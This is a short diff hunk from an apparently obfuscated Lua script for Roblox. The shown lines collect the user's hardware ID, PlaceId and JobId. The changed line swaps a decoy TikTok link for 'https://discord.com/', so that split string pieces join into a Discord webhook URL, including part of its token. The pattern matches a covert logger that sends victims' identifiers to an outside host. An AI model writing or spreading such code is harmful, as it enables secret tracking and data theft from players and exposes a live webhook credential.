@@ -17432,7 +17432,7 @@ L_1_[99] = gethwid and gethwid() or "Unknown HWID"
 L_1_[118] = game["PlaceId"] or 0
 L_1_[106] = game["JobId"] or "Unknown"
 L_1_[61] = L_1_[2]({
-	"https://www.tiktok.com/@brightaometa";
+	"https://discord.com/";
 	"api/webhooks/1450118";
 	"152213237841/nd89RDo";
 	"-W0xQyOODqwweKFSi5eK";
